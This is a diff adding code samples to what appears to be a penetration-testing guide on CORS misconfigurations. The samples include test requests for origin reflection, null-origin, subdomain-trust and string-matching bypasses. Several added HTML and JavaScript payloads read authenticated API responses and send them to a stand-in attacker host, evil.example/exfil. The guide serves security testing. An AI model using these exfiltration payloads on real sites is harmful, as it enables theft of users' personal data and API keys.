@@ -61,6 +61,25 @@ The simplest CORS misconfiguration: the server echoes the request `Origin` heade
 3. If the `Origin` value appears in `ACAO`, the server is reflecting it
 4. Check if `Access-Control-Allow-Credentials: true` is also present
 
+**Payload:**
+
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+Origin: https://evil.example
+Cookie: session=...
+```
+
+**Vulnerable response (origin fully reflected + credentials allowed):**
+
+```http
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://evil.example
+Access-Control-Allow-Credentials: true
+Content-Type: application/json
+
+{"email": "victim@target.com", "role": "user", "apiKey": "sk_live_..."}
+```
 
 **If both ACAO reflects origin AND ACAC is true**, this is a critical vulnerability. An attacker can host a page that makes authenticated cross-origin requests and reads the response.
 
@@ -76,6 +95,32 @@ When servers whitelist `null` as an allowed origin, attackers can trigger reques
 
 **Test payload:**
 
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+Origin: null
+Cookie: session=...
+```
+
+**Vulnerable response:**
+
+```http
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+```
+
+**Exploit page (sandboxed iframe forces `null` origin):**
+
+```html
+<!-- hosted at https://evil.example/null-cors.html -->
+<iframe sandbox="allow-scripts"
+        src="data:text/html,<script>
+          fetch('https://target.com/api/user/profile', {credentials:'include'})
+            .then(r => r.text())
+            .then(d => location = 'https://evil.example/exfil?data=' + encodeURIComponent(d));
+        </script>"></iframe>
+```
 
 **Steps:**
 
@@ -96,12 +141,41 @@ If the server allows `*.target.com`, an attacker controlling `evil-target.com` o
 
 **Test:**
 
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+Origin: https://evil-target.com
+```
 
 If `ACAO: https://evil-target.com` is returned, suffix matching is in use and exploitable.
 
 ### Subdomain Takeover
 
 If the server allows any subdomain but a subdomain is unclaimed (CNAME dangling), attacker can register it and exploit CORS.
+
+**Payload:** subdomain-trust abuse — XSS on a trusted subdomain + permissive CORS:
+
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+Origin: https://legacy.target.com
+```
+
+```http
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://legacy.target.com
+Access-Control-Allow-Credentials: true
+```
+
+If `legacy.target.com` has an XSS (`https://legacy.target.com/search?q=<script>...`), the injected script runs on a whitelisted origin and can read the credential-bearing response cross-origin:
+
+```html
+<script>
+  fetch('https://target.com/api/user/profile', {credentials: 'include'})
+    .then(r => r.json())
+    .then(d => fetch('https://evil.example/exfil', {method: 'POST', body: JSON.stringify(d)}));
+</script>
+```
 
 ---
 
@@ -115,6 +189,11 @@ A wildcard `ACAO: *` with `ACAC: true` is technically invalid — browsers block
 
 **Test:**
 
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+Origin: https://evil.example
+```
 
 If `ACAO: https://evil.com` (reflected) is returned instead of `ACAO: *`, the wildcard is not the real policy — the reflection is the vulnerability.
 
@@ -126,6 +205,11 @@ If the target serves over HTTPS but accepts `Origin: http://target.com`, this is
 
 **Test:**
 
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+Origin: http://target.com
+```
 
 If `ACAO: http://target.com` is returned on an HTTPS endpoint, an attacker on the same network (or a malicious HTTP page) can make cross-origin requests.
 
@@ -137,16 +221,31 @@ Servers sometimes use naive string matching instead of proper origin parsing.
 
 ### Prefix Attack
 
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+Origin: https://attacktarget.com
+```
 
 If the server checks `origin.startsWith("https://target")`, this passes because `"https://attacktarget.com"` starts with `"https://target"`.
 
 ### Suffix Attack
 
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+Origin: https://evil.target.com.attacker.example
+```
 
 If the server checks `origin.endsWith("target.com")`, this passes.
 
 ### Substring Attack
 
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+Origin: https://target.com.evil.example
+```
 
 If the server checks `origin.includes("target.com")`, this passes.
 
@@ -168,6 +267,31 @@ Once a CORS misconfiguration is confirmed with `ACAC: true` and reflected/whitel
 4. Exfiltrate data to attacker-controlled endpoint
 
 **Exfiltration payload:**
+
+```html
+<!-- https://evil.example/steal.html -->
+<script>
+  fetch('https://target.com/api/user/profile', {credentials: 'include'})
+    .then(r => r.text())
+    .then(data => {
+      navigator.sendBeacon('https://evil.example/exfil', data);
+    });
+</script>
+```
+
+XHR variant with preflight-free simple request:
+
+```javascript
+const xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://target.com/api/user/profile');
+xhr.withCredentials = true;
+xhr.onload = () => {
+  if (xhr.status === 200) {
+    new Image().src = 'https://evil.example/exfil?d=' + encodeURIComponent(xhr.responseText);
+  }
+};
+xhr.send();
+```
 
 
 ---
